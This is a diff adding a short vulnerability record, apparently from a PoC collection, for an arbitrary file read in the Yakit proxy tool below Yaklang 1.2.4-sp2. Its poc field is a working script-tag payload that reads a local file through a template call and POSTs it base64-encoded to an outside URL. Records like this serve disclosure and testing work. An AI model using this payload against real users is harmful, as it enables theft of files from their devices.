@@ -1,0 +1,8 @@
+vendor = "Yakit"
+name = "Yakit任意文件读取"
+type = "任意文件读取"
+source = "TG"
+info = "yakit是近年新兴的一个BurpSuite平替工具，和burp的区别就在于数据包放过去不用配置ip端口协议这些，但是yakit跑起来感觉卡卡的，远不如burp那么流畅，近期yakit爆出了一个任意文件读取漏洞，此漏洞通过在网页嵌入js代码实现读取yakit使用者设备上的文件 触发版本： 引擎版本< Yaklang 1.2.4-sp2 漏洞条件： 使用yakit的MITM代理并且启用任意插件"
+date = "08.14"
+poc = "<script> const xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://yakit.com/filesubmit\"); xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); xhr.send(`file={{base64enc(file(C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts))}}`); </script>"
+label = "1day"
